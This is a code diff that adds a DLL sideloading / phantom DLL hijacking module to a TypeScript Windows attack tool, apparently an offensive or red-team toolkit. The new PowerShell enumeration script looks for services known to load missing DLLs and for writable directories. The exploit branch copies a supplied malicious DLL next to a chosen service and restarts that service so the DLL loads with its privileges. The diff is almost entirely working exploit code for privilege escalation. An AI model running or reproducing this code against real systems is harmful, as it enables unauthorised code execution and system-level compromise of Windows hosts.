@@ -442,6 +442,10 @@ weak_service_perms: {
     description: "Find and exploit weak service permissions — enumerate services with modifiable DACLs (SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, WRITE_DAC, WRITE_OWNER) or writable service binaries, then optionally modify the binary path or replace the executable for privilege escalation",
     args: "--action enum|exploit [--service SERVICE_NAME] [--command CMD]",
   },
+dll_sideload: {
+    description: "DLL sideloading / phantom DLL hijacking for privilege escalation — exploit Windows services that load missing DLLs from writable directories. Known targets: StorSvc (SprintCSP.dll), IKEEXT (wlbsctrl.dll), NetMan (wlanhlp.dll), SessionEnv (TSMSISrv.dll), CDPSvc (cdpsgshims.dll), Wlanext (wlanext.dll), DiagHub (DataCollectors DLL)",
+    args: "--action enum|exploit [--target SERVICE] [--dll DLL_PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -15807,6 +15811,170 @@ if ($result -match 'SUCCESS') {
   return { output: output.join("\n"), findings }
 }
 
+async function dllSideload(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const target = argVal(args, "--target")
+  const dll = argVal(args, "--dll")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] DLL Sideload — privilege escalation via phantom DLL hijacking\n"]
+
+  if (action === "enum") {
+    const script = `
+# Known vulnerable service → missing DLL combinations
+$targets = @(
+    @{ Service = "StorSvc";     DLL = "SprintCSP.dll";    Path = "$env:SystemRoot\\System32"; Desc = "Windows Storage Service" },
+    @{ Service = "IKEEXT";      DLL = "wlbsctrl.dll";     Path = "$env:SystemRoot\\System32"; Desc = "IKE and AuthIP Keying" },
+    @{ Service = "NetMan";      DLL = "wlanhlp.dll";      Path = "$env:SystemRoot\\System32"; Desc = "Network Connections" },
+    @{ Service = "SessionEnv";  DLL = "TSMSISrv.dll";     Path = "$env:SystemRoot\\System32"; Desc = "Remote Desktop Configuration" },
+    @{ Service = "CDPSvc";      DLL = "cdpsgshims.dll";   Path = "$env:SystemRoot\\System32"; Desc = "Connected Devices Platform" },
+    @{ Service = "Wlanext";     DLL = "wlanext.dll";      Path = "$env:SystemRoot\\System32\\Wlan"; Desc = "Wireless LAN Extension" },
+    @{ Service = "DiagTrack";   DLL = "diagtrack_win.dll"; Path = "$env:SystemRoot\\System32"; Desc = "Diagnostics Tracking" },
+    @{ Service = "fxssvc";      DLL = "FXSST.dll";       Path = "$env:SystemRoot\\System32"; Desc = "Fax Service" },
+    @{ Service = "MSDTC";       DLL = "oci.dll";          Path = "$env:SystemRoot\\System32"; Desc = "Distributed Transaction Coordinator" },
+    @{ Service = "UsoSvc";      DLL = "windowscoredeviceinfo.dll"; Path = "$env:SystemRoot\\System32"; Desc = "Update Orchestrator" }
+)
+
+$exploitable = 0
+
+foreach ($t in $targets) {
+    $svc = Get-Service $t.Service -ErrorAction SilentlyContinue
+    if (-not $svc) { continue }
+
+    $dllPath = Join-Path $t.Path $t.DLL
+    $dllExists = Test-Path $dllPath
+    $svcRunning = $svc.Status -eq 'Running'
+    $svcStartMode = (Get-WmiObject Win32_Service -Filter "Name='$($t.Service)'" -ErrorAction SilentlyContinue).StartMode
+
+    # Check directory writability
+    $dirWritable = $false
+    if (Test-Path $t.Path) {
+        $testFile = Join-Path $t.Path ("cs_test_" + [guid]::NewGuid().ToString("N").Substring(0,6) + ".tmp")
+        try {
+            [System.IO.File]::WriteAllText($testFile, "test")
+            Remove-Item $testFile -Force
+            $dirWritable = $true
+        } catch {
+            $dirWritable = $false
+        }
+    }
+
+    # Also check via icacls
+    if (-not $dirWritable) {
+        $pathAcl = icacls $t.Path 2>$null | Out-String
+        if ($pathAcl -match 'Everyone.*\(F\)|Everyone.*\(M\)|Everyone.*\(W\)|BUILTIN\\Users.*\(F\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(W\)|Authenticated Users.*\(F\)|Authenticated Users.*\(M\)') {
+            $dirWritable = $true
+        }
+    }
+
+    $status = if (-not $dllExists -and $dirWritable) {
+        $exploitable++
+        "[+] EXPLOITABLE"
+    } elseif (-not $dllExists) {
+        "[~] Missing DLL but dir not writable"
+    } else {
+        "[-] DLL exists"
+    }
+
+    Write-Output "$status $($t.Service) ($($t.Desc))"
+    Write-Output "    DLL: $dllPath"
+    Write-Output "    DLL exists: $dllExists | Dir writable: $dirWritable"
+    Write-Output "    Service: $($svc.Status) | StartMode: $svcStartMode"
+    Write-Output ""
+}
+
+# Also check PATH directories for DLL search order hijacking
+Write-Output "[*] Checking writable PATH directories..."
+$pathDirs = $env:PATH -split ';'
+$writablePaths = @()
+foreach ($dir in $pathDirs) {
+    if (-not $dir -or -not (Test-Path $dir)) { continue }
+    $testFile = Join-Path $dir ("cs_test_" + [guid]::NewGuid().ToString("N").Substring(0,6) + ".tmp")
+    try {
+        [System.IO.File]::WriteAllText($testFile, "test")
+        Remove-Item $testFile -Force
+        $writablePaths += $dir
+        Write-Output "    [+] WRITABLE: $dir"
+    } catch { }
+}
+
+Write-Output ""
+Write-Output "=== Summary ==="
+Write-Output "Exploitable services: $exploitable"
+Write-Output "Writable PATH dirs: $($writablePaths.Count)"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const exploitMatch = result.stdout.match(/Exploitable services: (\d+)/)
+    const count = exploitMatch ? parseInt(exploitMatch[1]) : 0
+    if (count > 0) {
+      findings.push({
+        checkId: "WIN-DLL-SIDE-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "services://dll-sideload",
+        title: `${count} services vulnerable to DLL sideloading`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Fix service DLL search paths. Remove writable directories from system PATH.",
+      })
+    }
+  } else if (action === "exploit") {
+    if (!target) return { output: "[!] Required: --target SERVICE_NAME", findings }
+    if (!dll) return { output: "[!] Required: --dll PATH_TO_MALICIOUS_DLL", findings }
+
+    const script = `
+$svc = Get-Service '${target}' -ErrorAction SilentlyContinue
+if (-not $svc) { Write-Output "[-] Service not found: ${target}"; exit 1 }
+
+# Determine the expected DLL path
+$svcConfig = Get-WmiObject Win32_Service -Filter "Name='${target}'" -ErrorAction SilentlyContinue
+$svcPath = Split-Path $svcConfig.PathName.Trim('"') -Parent
+if (-not $svcPath) { $svcPath = "$env:SystemRoot\\System32" }
+
+Write-Output "[*] Service: ${target} ($($svc.Status))"
+Write-Output "[*] Service path: $svcPath"
+Write-Output "[*] Copying DLL..."
+
+# Copy the malicious DLL
+Copy-Item '${dll}' $svcPath -Force -ErrorAction Stop
+Write-Output "[+] DLL placed in: $svcPath"
+
+# Restart service to trigger DLL load
+if ($svc.Status -eq 'Running') {
+    Write-Output "[*] Restarting service to trigger DLL load..."
+    Restart-Service '${target}' -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+    $newStatus = (Get-Service '${target}').Status
+    Write-Output "[+] Service status: $newStatus"
+} else {
+    Write-Output "[*] Starting service to trigger DLL load..."
+    Start-Service '${target}' -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+    $newStatus = (Get-Service '${target}').Status
+    Write-Output "[+] Service status: $newStatus"
+}
+
+Write-Output "[+] DLL should have been loaded by service process"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-DLL-SIDE-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `service://${target}`,
+      title: `DLL sideloaded into service: ${target}`,
+      details: `Malicious DLL placed and service restarted`,
+      remediation: "Remove the sideloaded DLL. Restart the service with original binaries.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -15898,6 +16066,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   scheduled_task_hijack: scheduledTaskHijack,
   byovd: byovd,
   weak_service_perms: weakServicePerms,
+  dll_sideload: dllSideload,
 }
 
 export const WinhookTool = Tool.define("winhook", {
